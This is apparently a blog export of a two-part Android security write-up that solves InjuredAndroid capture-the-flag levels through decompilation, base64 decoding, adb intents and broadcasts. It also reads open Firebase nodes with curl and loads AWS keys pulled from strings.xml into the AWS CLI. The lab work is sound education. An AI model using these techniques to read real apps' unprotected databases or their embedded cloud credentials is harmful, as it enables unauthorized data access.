writableDatabase.insert(\u0026#34;Thisisatest\u0026#34;, null, contentValues); contentValues.put(\u0026#34;title\u0026#34;, Base64.decode(\u0026#34;VGhlIGZsYWcgaXMgYWxzbyBhIHBhc3N3b3JkIQ==\u0026#34;, 0)); contentValues.put(\u0026#34;subtitle\u0026#34;, h.c()); writableDatabase.insert(\u0026#34;Thisisatest\u0026#34;, null, contentValues); } From the analysis of the above code, the method is passing some base64 encoded strings and storing them into string variables.From the hint of application name, we are creating writable database through SQLiteDatabase functions. In this application we are writing some strings to the database. The name of the database being referenced is Thisisatest database.\nNext step is decode all base64 encoded strings in order to understand the logic of the program. The decoded strings below.\nVGhlIGZsYWcgaGFzaCE - The flag hash! MmFiOTYzOTBjN2RiZTM0MzlkZTc0ZDBjOWIwYjE3Njc - 2ab96390c7dbe3439de74d0c9b0b1767 VGhlIGZsYWcgaXMgYWxzbyBhIHBhc3N3b3JkIQ - The flag is also a password! The above decoded strings gives us an hint on solving the challenge. The author provides us with the hash of the flag.\nThe activity defines some interesting strings in the application, we decode the strings as shown in the code below.\nprivate final String w = \u0026#34;ZjFhZy1wYTU1\u0026#34;; #f1ag-pa55 private byte[] x = Base64.decode(\u0026#34;c3FsaXRl\u0026#34;, 0); #sqlite private byte[] y = Base64.decode(this.w, 0); private final String z; Next is to analyze the FlagSevensqliteActivity in order to understand the usage of the above strings in our activity. Important strings form the above are f1ag-pa55 and sqlite.\npublic FlagSevenSqliteActivity() { byte[] bArr = this.x; //sqlite  d.m.b.d.b(bArr, \u0026#34;decodedDirectoryOne\u0026#34;); Charset charset = StandardCharsets.UTF_8; d.m.b.d.b(charset, \u0026#34;StandardCharsets.UTF_8\u0026#34;); this.z = new String(bArr, charset); byte[] bArr2 = this.y; //f1ag-pa55  d.m.b.d.b(bArr2, \u0026#34;decodedDirectoryTwo\u0026#34;); Charset charset2 = StandardCharsets.UTF_8; d.m.b.d.b(charset2, \u0026#34;StandardCharsets.UTF_8\u0026#34;); this.A = new String(bArr2, charset2); f b2 = f.b(); d.m.b.d.b(b2, \u0026#34;FirebaseDatabase.getInstance()\u0026#34;); d d2 = b2.d(); d.m.b.d.b(d2, \u0026#34;FirebaseDatabase.getInstance().reference\u0026#34;); this.B = d2; d h = d2.h(this.z); d.m.b.d.b(h, \u0026#34;database.child(refDirectory)\u0026#34;); this.C = h; d h2 = this.B.h(this.A); d.m.b.d.b(h2, \u0026#34;database.child(refDirectoryTwo)\u0026#34;); this.D = h2; } From the above decompiled flagSevensqliteActivity, shows how the application is parsing the data from the firebase instance. In order to understand the data we are fetching, we need to know the nodes we are fetching the data from. From the decompiled code, we are accessing the string x as shown in the constructor method in line 1 through bArr byte array. our string is then passed to variable z constructor method as referenced by this.z constructor.\nThis means, f1ag-pa55 and sqlite are our firebase nodes.\nTo get the firebase link, we look for the link the strings.xml in the resources directory of the application.The link of the firebase url is shown in the image below. Manually test firebase endpoints manually to see if they are vulnerable as shown in the code below. Adding .json at the end of the firebase endpoint enables one to read data.\nFirst we test our endpoint using sqlite node.\nvx@archie:output$ curl https://injuredandroid.firebaseio.com/sqlite.json \u0026#34;S3V3N_11\u0026#34; From the results of the above, we get our flag. Accessing the endpoint using f1ag-pa55 using .json firebase trick, we get our password.\nvx@archie:output$ curl https://injuredandroid.firebaseio.com/f1ag-pa55.json \u0026#34;hunter2\u0026#34; hunter2 is our correct password for the challenge.\nFLag8 - AWS Storage and Security. This challenge is about understanding the misconfiguration of AWS storage and security implementation in the android applications.\nThe decompiled flagEightclass activity code looks like the one below.\npublic FlagEightLoginActivity() { f b2 = f.b(); d.m.b.d.b(b2, \u0026#34;FirebaseDatabase.getInstance()\u0026#34;); d d2 = b2.d(); d.m.b.d.b(d2, \u0026#34;FirebaseDatabase.getInstance().reference\u0026#34;); this.u = d2; d h = d2.h(\u0026#34;/aws\u0026#34;); d.m.b.d.b(h, \u0026#34;database.child(\\\u0026#34;/aws\\\u0026#34;)\u0026#34;); this.v = h; } The activity initializes firebase instance and fetches some information from the aws child node in the firebase storage model. Checking the above model if it is vulnerable to the .json trick of firebase, we get some information back as shown below\nvx@archie:ret2csu$ curl https://injuredandroid.firebaseio.com/aws.json \u0026#34;C10ud_S3cur1ty_lol\u0026#34; Next step is to analyze the onclick method of the application. This is the method that responds to events of an application that if you click an object defined by the in the code.\npublic final void onClick(View view) { if (FlagEightLoginActivity.this.H() == 0) { if (view != null) { Snackbar X = Snackbar.X(view, \u0026#34;AWS CLI.\u0026#34;, 0); X.Y(\u0026#34;Action\u0026#34;, null); X.N(); FlagEightLoginActivity flagEightLoginActivity = FlagEightLoginActivity.this; flagEightLoginActivity.I(flagEightLoginActivity.H() + 1); return; } d.m.b.d.k(); throw null; } else if (FlagEightLoginActivity.this.H() != 1) { } else { if (view != null) { Snackbar X2 = Snackbar.X(view, \u0026#34;AWS profiles and credentials.\u0026#34;, 0); X2.Y(\u0026#34;Action\u0026#34;, null); X2.N(); FlagEightLoginActivity.this.I(0); return; } d.m.b.d.k(); throw null; } } From the above hints provided in the application, gives hint on using of AWS CLI and understanding of AWS profiles and credentials.\nwhat are the AWS profile stored?\nMost of the strings are located in a file called strings.xml in the resources directory which are referenced throughout the application. In strings.xml file we have two interesting strings as shown in the code snippet below.\n\u0026lt;string name=\u0026#34;AWS_ID\u0026#34;\u0026gt;AKIAZ36DGKTUIOLDOBN6\u0026lt;/string\u0026gt; \u0026lt;string name=\u0026#34;AWS_SECRET\u0026#34;\u0026gt;KKT4xQAQ5cKzJOsoSImlNFFTRxjYkoc71vuRP48S\u0026lt;/string\u0026gt; AWS CLI is a unified tool to manage your AWS services, this enables one to configure the aws services through command line and automate them through scripts. To install aws-cli on your linux machine type the following in your desktop terminal.\npython -m pip install --user awscli For adding the aws profile, use the following command in the terminal as shown below.\nvx@archie:~$ aws configure AWS Access Key ID [None]: AKIAZ36DGKTUIOLDOBN6 AWS Secret Access Key [None]: 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 Flag9- FireBase What is firebase? Google firebase is a mobile and web application development platform that provides a real-time database that continuously syncs data between the cloud and the user’s mobile devices. Firebase databases are accessible via an API and that if developers have not correctly secured their firebase database, a simple web request can retrieve its entire content.\nWe need to analyze the FlagNineFirebaseActivity in order to understand how read and write rules are implemented in the application.\npublic final void goToFlagNineFirebaseActivity(View view) { startActivity(new Intent(this, FlagNineFirebaseActivity.class)); } public FlagNineFirebaseActivity() { byte[] decode = Base64.decode(\u0026#34;ZmxhZ3Mv\u0026#34;, 0); // flags/  this.v = decode; d.m.b.d.b(decode, \u0026#34;decodedDirectory\u0026#34;); Charset charset = StandardCharsets.UTF_8; d.m.b.d.b(charset, \u0026#34;StandardCharsets.UTF_8\u0026#34;); this.w = new String(decode, charset); f b2 = f.b(); d.m.b.d.b(b2, \u0026#34;FirebaseDatabase.getInstance()\u0026#34;); d d2 = b2.d(); d.m.b.d.b(d2, \u0026#34;FirebaseDatabase.getInstance().reference\u0026#34;); this.x = d2; d h = d2.h(this.w); d.m.b.d.b(h, \u0026#34;database.child(refDirectory)\u0026#34;); this.y = h; } Decode the base64 encoded string in order to understand strings stored in the decode variable. To decode the string we use linux utility called base64.\nvx@archie:~$ echo \u0026#34;ZmxhZ3Mv\u0026#34; | base64 -d flags/ From the above analysis,we are getting data from firebase storage, in the flags node.\nClicking on the hint view button in the application, we get hint on how to solve the challenge level. When the hint view is clicked it shows a string hint of \u0026ldquo;Use the .json trick database url\u0026rdquo; as shown in the decompiled code below.\npublic final void onClick(View view) { String str; if (FlagNineFirebaseActivity.this.H() == 0) { if (view != null) { str = \u0026#34;Use the .json trick with database url\u0026#34;; } else { d.m.b.d.k(); throw null; } } else if (FlagNineFirebaseActivity.this.H() == 1) { if (view != null) { str = \u0026#34;Filenames.\u0026#34;; } else { d.m.b.d.k(); throw null; } Firebase Realtime Rules Realtime database stores data as one large JSON tree and synchronized every time a new device is connected.The data received or stored in the database is determined by the security rules of read and write.\nFirebase allows read and write rules to the database to be set to true or false. when .read is set to true means describes if and data is allowed to be read by users and .write describes if and when data is allowed to be written. Example of a firebase rule where read and write are allowed.\n{ \u0026#34;rules\u0026#34;: { \u0026#34;.read\u0026#34;: true, \u0026#34;.write\u0026#34;: true } } When read and write rules are enabled means that everyone with access to the application can read and write unauthorized data to the database.\nThe firebase database url is defined in strings.xml file in the resource section.\n\u0026lt;string name=\u0026#34;firebase_database_url\u0026#34;\u0026gt;https://injuredandroid.firebaseio.com\u0026lt;/string\u0026gt; The firebase node defined in our instance is flags node, to check if the endpoint node is vulnerable we append a .json at the end of the url node as shown in the image below.\nvx@archie:injured$ curl https://injuredandroid.firebaseio.com/flags/.json \u0026#34;[nine!_flag]\u0026#34; If the url returns some data, that means that our endpoint is vulnerable. From the above output we were able to successfully solve the challenge.\nSecuring Firebase One can secure Firebase database by only allowing users of application to have only read permissions to a certain tree node instead of allowing read to the root node in the application. This means the applications can not read data from the neighboring nodes.\n{ \u0026#34;rules\u0026#34;: { \u0026#34;flag\u0026#34;: { \u0026#34;.read\u0026#34;: true, \u0026#34;.write\u0026#34;: false } } } ","date":"2021-10-25T15:53:55+03:00","image":"https://thuri10.github.io/post/androidsec/firebase.jpg","permalink":"https://thuri10.github.io/p/android-application-security-part2/","title":"Android Application Security Part2"},{"content":"Introduction This is a five part beginner series of Android application security with Vulnerable Android application examples. The application used in the first three part series is a vulnerable Android application developed by @B3nac.\nThe application is called InjuredAndroid, it covers different security concepts such as hardcoded secrets, weak cryptographic algorithms, misconfiguration, webview vulnerabilities etc. The application can be downloaded from the following provided links playstore or github.\nFor solving the challenges or following through the guides is you need to have an android phone or an emulator. For my case I will be using an android emulator throughout the series, my emulator of choice is android emulator which is part of android studio.\nEnviroment setup and decompilation For installation of application to the emulator we will use Android debug bridge(adb). adb is a set of command line tools which are installed as part of android studio. adb enables communication between emulator/real android phone with the connected computer.\nTo install the application, use install command as shown in the Linux terminal below.\nadb install InjuredAndroid-1.0.12-release.apk Launching the application in the emulator ,the interface will look like the image below.\n InjuredAndroid \nTools used throughout the series are:\n JADX Text Editor (visual studio) Android Studio  JADX is a bundle of command line and GUI tools. jadx enables one to produce java source code from android Dex and APK files. This tool will aid us to decompile the android application to java code which is human readable.\n For reverse engineering/ code auditing of every application, you need to have a clear set of goal or objective of what you want to achieve. This helps narrow down the analysis and avoid many rabbit holes.\n FLAG ONE - LOGIN Goal : Input the right flag.\nFor the first challenge is to get the correct flag. flag is a piece of reward if you do correct task you are asked to do. Looking at the decompiled code in the editor as shown below, there is an interesting function called submitFlag. submit flag function is responsible for validation of the userinput.\npublic final void submitFlag(View view) { EditText editText = (EditText) findViewById(R.id.editText2); C2724g.m882d(editText, \u0026#34;editText2\u0026#34;); if (C2724g.m885a(editText.getText().toString(), \u0026#34;F1ag_0n3\u0026#34;)) { Intent intent = new Intent(this, FlagOneSuccess.class); new FlagsOverview().m4085J(true); new ApplicationC1492j().m4065b(this, \u0026#34;flagOneButtonColor\u0026#34;, true); startActivity(intent); } } From the above code, the FlagoneActivity class implements a functionality which the user input is compared with hardcoded flag in the application.\nThe user entered flag string is compared with the hardcoded flag which is \u0026ldquo;F1ag_0n3\u0026rdquo;. The method m10785a compares the two objects ( user input flag and hardcoded flag) and return a boolean depending on the result of the comparison of two objects. A boolean result can be either true or false.\npublic static boolean m10785a(Object obj, Object obj2) { return obj == null ? obj2 == null : obj.equals(obj2); } If the condition is True, new Intent is started which is FlagOneSuccess. Entering hardcoded flag as our input, we get a success message and color of Flag1 in flagsOverview Activity changes to green, meaning we have successfully solved the challenge1.\n Flag one solved \nThe flag for level1 is \u0026ldquo;F1ag_0n3\u0026rdquo;.\nFor other levels if solved successfully, the color of the flag corresponding to that level will change to green.\nFLAG TWO - EXPORTED ACTIVITY Goal : There is a way to bypass the main activity and invoke other activities that are exported.\nWhat is an activity?\nAn activity is a single, focused thing that the user can do. It is an application component that provide a user Interface for users to interact with.\nLooking at the flagtwoactivity, the source code looks like the one shown below.\npublic class FlagTwoActivity extends ActivityC0453c { /* renamed from: w */ int f4461w = 0; /* renamed from: F */ public /* synthetic */ void m4090F(View view) { int i = this.f4461w; if (i == 0) { Snackbar X = Snackbar.m2647X(view, \u0026#34;Key words Activity and exported.\u0026#34;, 0); X.m2646Y(\u0026#34;Action\u0026#34;, null); X.mo2650N(); this.f4461w++; } else if (i == 1) { Snackbar X2 = Snackbar.m2647X(view, \u0026#34;Exported Activities can be accessed with adb or Drozer.\u0026#34;, 0); X2.m2646Y(\u0026#34;Action\u0026#34;, null); X2.mo2650N(); this.f4461w = 0; } } /* access modifiers changed from: protected */ @Override // androidx.appcompat.app.ActivityC0453c, androidx.fragment.app.ActivityC0797d, androidx.activity.ComponentActivity, androidx.core.app.ActivityC0714e, android.app.Activity  public void onCreate(Bundle bundle) { super.onCreate(bundle); setContentView(R.layout.activity_flag_two); m8078C((Toolbar) findViewById(R.id.toolbar)); ((FloatingActionButton) findViewById(R.id.fab)).setOnClickListener(new View.OnClickListener() { // from class: b3nac.injuredandroid.d  @Override // android.view.View.OnClickListener  public final void onClick(View view) { FlagTwoActivity.this.m4090F(view); } }); } } The oncreate method is used for initializing our activity. The goal of the challenge is to invoke the flagtwoactivity from an external application. This activity is called exported activity, meaning it can be started outside the context of the application.\nActivities in android are defined in a file called AndroidManifest.xml .\n\u0026lt;activity android:name=\u0026#34;b3nac.injuredandroid.b25lActivity\u0026#34; android:exported=\u0026#34;true\u0026#34;/\u0026gt; As you see above, the activity b3nac.injuredandroid.b25lActivity can be invoked by external application because android:exported attribute is set to true.\nFor exploitation of the above issue we will use adb. First we use adb to list the installed packages in the device and grep the application of our interest using Linux grep utility.\nvx@archie:~$ adb shell pm list packages | grep injuredandroid package:b3nac.injuredandroid What happens when invoke b25lActivity class activity?\nWhen b25lActivity activity is invoked by an external program, it sets the flag2 color to green in the FlagsOverview activity.\n/* loaded from: classes.dex */ public final class b25lActivity extends ActivityC0453c { /* access modifiers changed from: protected */ @Override // androidx.appcompat.app.ActivityC0453c, androidx.fragment.app.ActivityC0797d, androidx.activity.ComponentActivity, androidx.core.app.ActivityC0714e, android.app.Activity  public void onCreate(Bundle bundle) { super.onCreate(bundle); setContentView(R.layout.activity_b25l); ApplicationC1492j.f4506j.m4062a(this); new FlagsOverview().m4082M(true); new ApplicationC1492j().m4065b(this, \u0026#34;flagTwoButtonColor\u0026#34;, true); } } Invoke the activity b25lActivity using adb. Other method of invoking exported activities is by creating an android application thats starts the activity of the target`s activity.\nvx@archie:~$ adb shell am start -n b3nac.injuredandroid/.b25lActivity Starting: Intent { cmp=b3nac.injuredandroid/.b25lActivity } when the activity two is started successfully by an external application, we are rewarded with a flag.\n Flag two \nFLAG THREE - RESOURCES Goal: Understanding how an application references Resources.\nwhat are resources?\nResources are used for anything from defining colors, images, layouts, menus and string values. Everything defined here is referenced in the application`s code.\nThe decompiled code for FlagThreeActivity is shown below.\npublic final void submitFlag(View view) { EditText editText = (EditText) findViewById(R.id.editText2); C2724g.m882d(editText, \u0026#34;editText2\u0026#34;); if (C2724g.m885a(editText.getText().toString(), getString(R.string.cmVzb3VyY2VzX3lv))) { Intent intent = new Intent(this, FlagOneSuccess.class); new FlagsOverview().m4083L(true); new ApplicationC1492j().m4065b(this, \u0026#34;flagThreeButtonColor\u0026#34;, true); startActivity(intent); } } Looking at the above submitFlag function defined in FlagThreeActivity.java, we are comparing the user input with the value referenced at Resource cmVzb3VyY2VzX3lv . R stands for resource.\nLooking at the strings we get our flags as referenced by the string above.\n\u0026lt;string name=\u0026#34;cmVzb3VyY2VzX3lv\u0026#34;\u0026gt;F1ag_thr33\u0026lt;/string\u0026gt; The flag is F1ag_thr33\nFLAG FOUR - LOGIN2 Goal: Get the right flag\nFor flag four we analyze FlagFourActivity.java.. First we need figure out the logic implemented in the submitflag class in the code below.\npublic final void submitFlag(View view) { EditText editText = (EditText) findViewById(R.id.editText2); C2724g.m882d(editText, \u0026#34;editText2\u0026#34;); String obj = editText.getText().toString(); byte[] a = new C1489g().m4070a(); C2724g.m882d(a, \u0026#34;decoder.getData()\u0026#34;); if (C2724g.m885a(obj, new String(a, C2759c.f6854a))) { Intent intent = new Intent(this, FlagOneSuccess.class); new FlagsOverview().m4086I(true); new ApplicationC1492j().m4065b(this, \u0026#34;flagFourButtonColor\u0026#34;, true); startActivity(intent); } } From the above,we are are getting user input and comparing with bytes in variable a. To understand the logic we analyze the method c1489g and member class m4070a.\npublic class C1489g { /* renamed from: a */ private byte[] f4499a = Base64.decode(\u0026#34;NF9vdmVyZG9uZV9vbWVsZXRz\u0026#34;, 0); /* renamed from: a */ public byte[] m4070a() { return this.f4499a; } Looking at the public class c1489g, it implements base64 decoding of the byte string and returned to the submitFlag class .\nTo get the string we are returning we need to decode the encoded string using base64 utility installed in linux .\n$ echo \u0026#34;NF9vdmVyZG9uZV9vbWVsZXRz\u0026#34; | base64 -d 4_overdone_omelets Our flag is : 4_overdone_omelets\nFLAG FIVE - EXPORTED BROADCAST RECEIVERS Goal: Understand how Broadcast receivers work\nApplications receive broadcasts in two ways:\n Through manifest-declared receivers. Context-registered receivers.  Manifest-declared receivers - This type causes the system to launch application when broadcast is received. Searching in AndroidManifest.xml file we get where our broadcast is declared.\n\u0026lt;receiver android:name=\u0026#34;b3nac.injuredandroid.FlagFiveReceiver\u0026#34; android:exported=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;activity android:theme=\u0026#34;@style/AppTheme.NoActionBar\u0026#34; android:label=\u0026#34;@string/title_activity_flag_five\u0026#34; android:name=\u0026#34;b3nac.injuredandroid.FlagFiveActivity\u0026#34;/\u0026gt; In order to understand the Broadcast receivers, we need to analyze the oncreate() method in the FlagFiveActivity.java file.\npublic void onCreate(Bundle bundle) { super.onCreate(bundle); setContentView(R.layout.activity_flag_five); m8078C((Toolbar) findViewById(R.id.toolbar)); ((FloatingActionButton) findViewById(R.id.fab)).setOnClickListener(new View.OnClickListener() { // from class: b3nac.injuredandroid.c  @Override // android.view.View.OnClickListener  public final void onClick(View view) { FlagFiveActivity.this.m4118G(view); } }); new ComponentName(this, FlagFiveReceiver.class); getPackageManager(); C0310a.m8404b(this).m8403c(this.f4409x, new IntentFilter(\u0026#34;com.b3nac.injuredandroid.intent.action.CUSTOM_INTENT\u0026#34;)); ((Button) findViewById(R.id.button9)).setOnClickListener(new View.OnClickListener() { // from class: b3nac.injuredandroid.b  @Override // android.view.View.OnClickListener  public final void onClick(View view) { FlagFiveActivity.this.m4117H(view); // invokes the intent  } }); } From the above code, when we click flag2 button, we invoke intent which is defined in class m4117H.\nAn intent is used to perform an action on the screen. Therefore clicking the button element in our application we are invoking an new intent. Intents are used for sending a broadcast receiver.\n/* renamed from: H */ public /* synthetic */ void m4117H(View view) { m4119F(); } public void m4119F() { sendBroadcast(new Intent(\u0026#34;com.b3nac.injuredandroid.intent.action.CUSTOM_INTENT\u0026#34;)); } Looking at the component name FlagFiveReceiver class. when the intent is invoked twice, we receive our flag. The class implements a conditional if else loop condition for checking the number of intents. when the correct flag is displayed, the intents counter is set to zero( i2 = 0), where i2 variable is the intent counter as shown in the java code below.\npublic final class FlagFiveReceiver extends BroadcastReceiver { /* renamed from: a */ private static int f4410a; @Override // android.content.BroadcastReceiver  public void onReceive(Context context, Intent intent) { String str; int i; C2724g.m881e(context, \u0026#34;context\u0026#34;); C2724g.m881e(intent, \u0026#34;intent\u0026#34;); ApplicationC1492j.f4506j.m4062a(context); int i2 = f4410a; if (i2 == 0) { StringBuilder sb = new StringBuilder(); sb.append(C2765h.m809e(\u0026#34;\\n Action: \u0026#34; + intent.getAction() + \u0026#34;\\n\\n \u0026#34;)); sb.append(C2765h.m809e(\u0026#34;\\n URI: \u0026#34; + intent.toUri(1) + \u0026#34;\\n\\n \u0026#34;)); str = sb.toString(); C2724g.m882d(str, \u0026#34;sb.toString()\u0026#34;); Log.d(\u0026#34;DUDE!:\u0026#34;, str); } else { str = \u0026#34;Keep trying!\u0026#34;; if (i2 != 1) { if (i2 == 2) { new FlagsOverview().m4087H(true); new ApplicationC1492j().m4065b(context, \u0026#34;flagFiveButtonColor\u0026#34;, true); Toast.makeText(context, \u0026#34;You are a winner \u0026#34; + C1494k.m4061a(\u0026#34;Zkdlt0WwtLQ=\u0026#34;), 1).show(); i = 0; f4410a = i; } Toast.makeText(context, str, 1).show(); return; } } Toast.makeText(context, str, 1).show(); i = f4410a + 1; f4410a = i; } } onReceive method is responsible for receiving intents sent. Invoking our Activity two times we get a flag.\n Flag Five \nThe flag for challenge five is F1v3!\n","date":"2021-10-20T20:19:29+03:00","image":"https://thuri10.github.io/post/androidsec/android.jpg","permalink":"https://thuri10.github.io/p/android-application-security-series-part-1/","title":"Android Application Security Series- Part 1"}]